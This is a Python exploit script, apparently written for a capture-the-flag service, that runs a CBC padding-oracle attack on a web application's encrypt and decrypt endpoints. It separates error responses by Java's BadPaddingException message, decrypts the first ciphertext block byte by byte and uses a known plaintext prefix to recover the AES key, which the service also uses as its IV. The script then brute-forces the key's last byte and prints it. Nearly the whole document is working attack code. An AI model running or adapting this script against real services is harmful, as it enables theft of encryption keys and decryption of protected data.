#!/usr/bin/python3

from base64 import b64encode, b64decode
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from struct import pack, unpack
from Crypto.Cipher import AES
import json
import codecs

class Sploit:
    def __init__(self, host):
        self.host = host

    def encrypt(self, body):
        url = "http://%s/images/encrypt" % (self.host)
        with urlopen(url, data=body) as response:
            reader = codecs.getreader("utf-8")
            response = json.load(reader(response))
            id = response['id']

        url = "http://%s/chunks/%s" % (self.host, id)
        with urlopen(url) as response:
            chunk = response.read()

        length = unpack(">L", chunk[:4])[0]
        return chunk[4:4 + length]

    def decrypt_first_block(self, ciphertext, block_size):
        ciphertext = bytearray(ciphertext[:2*block_size])
        decrypted = bytearray(block_size)
        intermediate = bytearray(block_size)
        for i in range(block_size - 1, -1, -1):
            data = bytearray(ciphertext)
            padding = (block_size - i)
            for j in range(i + 1, block_size):
                data[j] = padding ^ intermediate[j]

            possible_value = self.find_possible_byte_value(data, i, block_size)
            intermediate[i] = possible_value ^ padding
            decrypted[i] = ciphertext[i] ^ intermediate[i]

            print("Found byte at position %d, it's %d" % (i, decrypted[i]))
        return decrypted


    def find_possible_byte_value(self, data, i, block_size):
        original_value = data[i]
        for b in range(256):
            data[i] = b
            if sploit.try_decrypt(data) and b ^ original_value ^ (block_size - i) != 1:
                return b
        return 1


    def try_decrypt(self, data):
        try:
            url = "http://%s/images/decrypt" % (self.host)
            data = pack(">L", len(data)) + data
            body = ("{\"key\":\"AAAAAAAAAAAAAAAAAAAAAA==\",\"chunk\":\"%s\"}" % b64encode(data).decode('ascii')).encode('ascii')
            request = Request(url, data=body, headers={ "Content-Type": "application/json" })
            with urlopen(request):
                return True
        except HTTPError as ex:
            msg = ex.read().decode('utf-8')
            msgObj = json.loads(msg)
            return msgObj['exception'] != 'javax.crypto.BadPaddingException'

    def brute_key_last_byte(self, possible_key, data):
        for b in range(256):
            try:
                possible_key[-1] = b
                cipher = AES.new(bytes(possible_key), AES.MODE_CBC, bytes(possible_key))
                decrypted = cipher.decrypt(bytes(data))
                if decrypted[-7:] == b'\x07\x07\x07\x07\x07\x07\x07':
                    return possible_key
            except Exception as ex:
                pass
        raise Exception("Failed to deduce the key")

if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[1:]:
        print('Usage: %s <host>' % (sys.argv[0], ))
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)

    sploit = Sploit(sys.argv[1])

    block_size = 16
    ciphertext = sploit.encrypt(b'hello')
    intermediate = sploit.decrypt_first_block(bytearray(block_size) + ciphertext, block_size)

    key = bytearray([ x ^ y for x, y in zip(intermediate, "{\"sessionKey\":\"A".encode('utf-8')) ])
    key = sploit.brute_key_last_byte(key, ciphertext)

    print(codecs.encode(key, 'hex').decode('ascii'))
